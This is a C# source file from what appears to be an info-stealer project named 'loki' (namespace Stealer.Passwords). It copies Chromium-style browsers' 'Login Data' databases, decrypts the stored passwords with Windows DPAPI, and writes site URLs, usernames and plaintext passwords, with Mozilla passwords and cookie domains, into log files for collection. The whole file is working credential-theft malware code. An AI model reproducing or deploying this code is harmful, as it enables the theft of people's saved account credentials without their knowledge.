﻿using loki.loki.Stealer.Cookies;
using loki.sqlite;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace loki.loki.Stealer.Passwords
{
   public class GetPasswords
    {
        public static List<string> profile_list = new List<string>();
        public static List<string> browser_name_list = new List<string>();
        public static List<string> url = new List<string>();
        public static List<string> login = new List<string>();
        public static List<string> password = new List<string>();
        public static List<string> passwors = new List<string>();
        public static List<string> credential = new List<string>();
        public static int Cpassword;


        public static void Passwords_Grab(string profilePath, string browser_name, string profile)
        {
            try
            {
                string text = Path.Combine(profilePath, "Login Data");
                browser_name_list.Add(browser_name);
                profile_list.Add(profile);
                
                CNT cNT = new CNT(Cookies.GetCookies.CreateTempCopy(text));
                cNT.ReadTable("logins");
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    Cpassword++;
                    try
                    {
                        credential.Add("Site_Url : " + cNT.ParseValue(i, "origin_url").Trim() + System.Environment.NewLine + "Login : " + cNT.ParseValue(i, "username_value").Trim() + System.Environment.NewLine + "Password : " + Cookies.GetCookies.DecryptBlob(cNT.ParseValue(i, "password_value"), DataProtectionScope.CurrentUser).Trim() + System.Environment.NewLine);
                       
                    }
                    catch
                    {
                    }

                   
                }
                for (int a = 0; a< credential.Count; a++)
                {
                    password.Add("Browser : " + browser_name + System.Environment.NewLine + "Profile : " + profile + System.Environment.NewLine + credential[a]);
                }
                credential.Clear();
            }
            catch
            {
             
            }
        }
        public static void Write_Passwords()
        {
            using (StreamWriter streamWriter = new StreamWriter(Program.dir + "\\passwords.log"))
            {
                for (int i = 0; i < password.Count; i++)
                {
                    streamWriter.Write(password[i]);
                    streamWriter.Write(Environment.NewLine);

                }
                for(int a = 0; a < mozila.passwors.Count(); a++)
                {
                    streamWriter.Write(mozila.passwors[a]);
                    streamWriter.Write(Environment.NewLine);
                }
            }
            using (StreamWriter streamWriter = new StreamWriter(Program.dir + "\\cookieDomains.log"))
            {
                for (int i = 0; i < GetCookies.domains.Count; i++)
                {
                    streamWriter.Write(GetCookies.domains[i]);
                    streamWriter.Write(Environment.NewLine);


                }
            }
        }
        }
    }

